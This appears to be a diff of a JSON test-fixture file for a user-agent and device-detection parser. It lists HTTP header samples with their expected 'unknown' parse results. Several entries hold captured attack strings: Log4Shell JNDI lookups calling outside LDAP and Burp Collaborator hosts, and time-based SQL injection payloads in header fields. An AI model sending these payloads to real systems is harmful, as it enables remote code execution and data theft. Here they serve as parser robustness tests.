@@ -1,48 +1,6 @@
 [
   {
     "headers": {
-      "user-agent": "-1 OR 2+137-137-1=0+0+0+1 --"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown"
-    },
-    "client": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "unknown",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
       "user-agent": "-1 OR 2+128-128-1=0+0+0+1 --"
     },
     "device": {
@@ -1177,70 +1135,9 @@
   },
   {
     "headers": {
-      "user-agent": "awin.com - site screen shotter",
-      "content-length": "0"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown"
-    },
-    "client": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "unknown",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "access-control-request-headers": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "access-control-request-method": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "authentication": "Basic ${jndi:ldap://209.126.4.156:1389/Exploit}, Bearer ${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "location": "$%7Bjndi:ldap://209.126.4.156:1389/Exploit%7D",
       "origin": "https://fcbz.com",
       "user-agent": "${jndi:ldap://209.126.4.156:1389/Exploit} fcbz",
-      "x-api-version": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "x-csrf-token": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "x-druid-comment": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "x-origin": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "x-rewrite-url": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "x-remote-ip": "${jndi:ldap://209.126.4.156:1389/Exploit}, ${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "x-forwarded": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "x-forwarded-for-original": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "x-original-host": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "x-original-url": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "x-original-user-agent": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "x-originally-forwarded-for": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "x-originating-ip": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "x-original-remote-addr": "${jndi:ldap://209.126.4.156:1389/Exploit}",
-      "x-real-ip": "${jndi:ldap://209.126.4.156:1389/Exploit}"
+      "x-original-user-agent": "${jndi:ldap://209.126.4.156:1389/Exploit}"
     },
     "device": {
       "architecture": null,
@@ -1283,18 +1180,7 @@
   {
     "headers": {
       "user-agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR';if(now()=sysdate(),sleep(25),0)/*'XOR(if(now()=sysdate(),sleep(25),0))OR';\"XOR(if(now()=sysdate(),sleep(25),0))OR\"*/ fcbz",
-      "x-forward-for": "127.0.0.1'XOR(if(now()=sysdate(),sleep(5*5),0))OR';if(now()=sysdate(),sleep(26),0)/*'XOR(if(now()=sysdate(),sleep(26),0))OR'\"XOR(if(now()=sysdate(),sleep(26),0))OR\"*/",
-      "x-forwarded": "127.0.0.1'XOR(if(now()=sysdate(),sleep(5*5),0))OR';if(now()=sysdate(),sleep(26),0)/*'XOR(if(now()=sysdate(),sleep(26),0))OR'\"XOR(if(now()=sysdate(),sleep(25),0))OR\"*/",
-      "x-forwarded-for-original": "127.0.0.1'XOR(if(now()=sysdate(),sleep(5*5),0))OR';",
-      "x-original-host": "127.0.0.1'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",
-      "x-original-url": "127.0.0.1'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",
       "x-original-user-agent": "'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",
-      "x-originally-forwarded-for": "127.0.0.1'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",
-      "x-originating-ip": "127.0.0.1'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",
-      "x-original-remote-addr": "127.0.0.1'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",
-      "x-real-ip": "127.0.0.1'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",
-      "x-remote-ip": "127.0.0.1'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",
-      "x-rewrite-url": "127.0.0.1'XOR(if(now()=sysdate(),sleep(5*5),0))OR'",
       "origin": "https://fcbz.com"
     },
     "device": {
@@ -1338,6 +1224,49 @@
   {
     "headers": {
       "user-agent": "Buck/2.3; (+https://app.hypefactors.com/media-monitoring/about.html)"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown"
+    },
+    "client": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "unknown",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "from": "crawl@docoloc.de",
+      "user-agent": "Docoloc"
     },
     "device": {
       "architecture": null,
@@ -2891,93 +2820,6 @@
   },
   {
     "headers": {
-      "user-agent": "Explorer",
-      "x-p2p-peerdist": "Version=1.1",
-      "x-p2p-peerdistex": "MinContentInformation=1.0, MaxContentInformation=2.0"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown"
-    },
-    "client": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "unknown",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Scribbr-Citation-Bot",
-      "content-type": "text/html; charset=utf-8"
-    },
-    "device": {
-      "architecture": null,
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "dualOrientation": null,
-      "simCount": null,
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "bits": null
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown"
-    },
-    "client": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "unknown",
-      "isbot": false
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
       "user-agent": "\\\\\\"
     },
     "device": {
@@ -3146,27 +2988,9 @@
   },
   {
     "headers": {
-      "access-control-request-headers": "${jndi:ldap://173.212.215.164:1389/a}",
-      "access-control-request-method": "${jndi:ldap://173.212.215.164:1389/a}",
-      "authentication": "Basic ${jndi:ldap://173.212.215.164:1389/a}, Bearer ${jndi:ldap://173.212.215.164:1389/a}",
-      "location": "$%7Bjndi:ldap://173.212.215.164:1389/a%7D",
       "origin": "https://fcbz.com",
       "user-agent": "${jndi:ldap://173.212.215.164:1389/a} fcbz",
-      "x-api-version": "${jndi:ldap://173.212.215.164:1389/a}",
-      "x-csrf-token": "${jndi:ldap://173.212.215.164:1389/a}",
-      "x-druid-comment": "${jndi:ldap://173.212.215.164:1389/a}",
-      "x-origin": "${jndi:ldap://173.212.215.164:1389/a}",
-      "x-rewrite-url": "${jndi:ldap://173.212.215.164:1389/a}",
-      "x-remote-ip": "${jndi:ldap://173.212.215.164:1389/a}, ${jndi:ldap://173.212.215.164:1389/a}",
-      "x-forwarded": "${jndi:ldap://173.212.215.164:1389/a}",
-      "x-forwarded-for-original": "${jndi:ldap://173.212.215.164:1389/a}",
-      "x-original-host": "${jndi:ldap://173.212.215.164:1389/a}",
-      "x-original-url": "${jndi:ldap://173.212.215.164:1389/a}",
-      "x-original-user-agent": "${jndi:ldap://173.212.215.164:1389/a}",
-      "x-originally-forwarded-for": "${jndi:ldap://173.212.215.164:1389/a}",
-      "x-originating-ip": "${jndi:ldap://173.212.215.164:1389/a}",
-      "x-original-remote-addr": "${jndi:ldap://173.212.215.164:1389/a}",
-      "x-real-ip": "${jndi:ldap://173.212.215.164:1389/a}"
+      "x-original-user-agent": "${jndi:ldap://173.212.215.164:1389/a}"
     },
     "device": {
       "architecture": null,
@@ -3208,27 +3032,9 @@
   },
   {
     "headers": {
-      "access-control-request-headers": "${jndi:ldap://x${hostName}.geld.de.accesscontrolrequestheaders.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "access-control-request-method": "${jndi:ldap://x${hostName}.geld.de.accesscontrolrequestmethod.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "authentication": "Basic ${jndi:ldap://x${hostName}.geld.de.authenticationbasic.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}, Bearer ${jndi:ldap://x${hostName}.geld.de.authenticationbearer.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "location": "$%7Bjndi:ldap://x$%7BhostName%7D.geld.de.location.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a%7D",
       "origin": "https://fcbz.com",
       "user-agent": "${jndi:ldap://x${hostName}.geld.de.useragent.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a} fcbz",
-      "x-api-version": "${jndi:ldap://x${hostName}.geld.de.xapiversion.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "x-csrf-token": "${jndi:ldap://x${hostName}.geld.de.xcsrftoken.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "x-druid-comment": "${jndi:ldap://x${hostName}.geld.de.xdruidcomment.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "x-origin": "${jndi:ldap://x${hostName}.geld.dexorigin.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "x-rewrite-url": "${jndi:ldap://x${hostName}.geld.de.xReWriteURL.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "x-remote-ip": "${jndi:ldap://x${hostName}.geld.de.xRemoteIP.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}, ${jndi:ldap://x${hostName}.geld.de.xForHost.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "x-forwarded": "${jndi:ldap://x${hostName}.geld.de.xForwarded.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "x-forwarded-for-original": "${jndi:ldap://x${hostName}.geld.de.xFor4Origional.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "x-original-host": "${jndi:ldap://x${hostName}.geld.de.xOrigionalHost.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "x-original-url": "${jndi:ldap://x${hostName}.geld.de.xOrigionalURL.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "x-original-user-agent": "${jndi:ldap://x${hostName}.geld.de.xOrigionalUserAgent.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "x-originally-forwarded-for": "${jndi:ldap://x${hostName}.geld.de.xOrigionallyForwardedFor.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "x-originating-ip": "${jndi:ldap://x${hostName}.geld.de.xOrigionatingIP.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "x-original-remote-addr": "${jndi:ldap://x${hostName}.geld.de.xOrionalRemoteIP.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}",
-      "x-real-ip": "${jndi:ldap://x${hostName}.geld.de.xRealIP.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}"
+      "x-original-user-agent": "${jndi:ldap://x${hostName}.geld.de.xOrigionalUserAgent.8mv152j7629m14gp8l4hsy8if9lz9o.burpcollaborator.net/a}"
     },
     "device": {
       "architecture": null,
@@ -4152,27 +3958,9 @@
   },
   {
     "headers": {
-      "access-control-request-headers": "${jndi:ldap://XXXXX${hostName}.geld.de.accesscontrolrequestheaders.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "access-control-request-method": "${jndi:ldap://XXXXX${hostName}.geld.de.accesscontrolrequestmethod.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "authentication": "Basic ${jndi:ldap://XXXXX${hostName}.geld.de.authenticationbasic.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}, Bearer ${jndi:ldap://XXXXX${hostName}.geld.de.authenticationbearer.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "location": "$%7Bjndi:ldap://XXXXX$%7BhostName%7D.geld.de.location.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a%7D",
       "origin": "https://fcbz.com",
       "user-agent": "${jndi:ldap://XXXXX${hostName}.geld.de.useragent.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a} fcbz",
-      "x-api-version": "${jndi:ldap://XXXXX${hostName}.geld.de.xapiversion.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "x-csrf-token": "${jndi:ldap://XXXXX${hostName}.geld.de.xcsrftoken.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "x-druid-comment": "${jndi:ldap://XXXXX${hostName}.geld.de.xdruidcomment.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "x-origin": "${jndi:ldap://XXXXX${hostName}.geld.dexorigin.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "x-rewrite-url": "${jndi:ldap://XXXXX${hostName}.geld.de.xReWriteURL.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "x-remote-ip": "${jndi:ldap://XXXXX${hostName}.geld.de.xRemoteIP.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}, ${jndi:ldap://XXXXX${hostName}.geld.de.xForHost.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "x-forwarded": "${jndi:ldap://XXXXX${hostName}.geld.de.xForwarded.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "x-forwarded-for-original": "${jndi:ldap://XXXXX${hostName}.geld.de.xFor4Origional.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "x-original-host": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrigionalHost.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "x-original-url": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrigionalURL.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "x-original-user-agent": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrigionalUserAgent.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "x-originally-forwarded-for": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrigionallyForwardedFor.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "x-originating-ip": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrigionatingIP.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "x-original-remote-addr": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrionalRemoteIP.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}",
-      "x-real-ip": "${jndi:ldap://XXXXX${hostName}.geld.de.xRealIP.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}"
+      "x-original-user-agent": "${jndi:ldap://XXXXX${hostName}.geld.de.xOrigionalUserAgent.t2wf1syssltblsgdclv32syhp8vzjo.burpcollaborator.net/a}"
     },
     "device": {
       "architecture": null,
@@ -4214,9 +4002,7 @@
   },
   {
     "headers": {
-      "user-agent": "ManicTime/4.7.5.1",
-      "x-p2p-peerdist": "Version=1.1",
-      "x-p2p-peerdistex": "MinContentInformation=1.0, MaxContentInformation=2.0"
+      "user-agent": "Datadog/Synthetics"
     },
     "device": {
       "architecture": null,
@@ -4258,9 +4044,133 @@
   },
   {
     "headers": {
-      "accept-charset": "ISO-8859-1, utf-8, *;q=0.7",
-      "range": "bytes=0-50000",
-      "user-agent": "Valve/Steam HTTP Client 1.0"
+      "user-agent": "DatadogSynthetics"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown"
+    },
+    "client": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "unknown",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "RestSharp/106.12.0.0"
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown"
+    },
+    "client": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "unknown",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Expanse indexes customers\\xe2\\x80\\x99 network perimeters. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com."
+    },
+    "device": {
+      "architecture": null,
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "dualOrientation": null,
+      "simCount": null,
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "bits": null
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown"
+    },
+    "client": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "type": "unknown",
+      "isbot": false
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Buck/2.3.2; (+https://app.hypefactors.com/media-monitoring/about.html)"
     },
     "device": {
       "architecture": null,
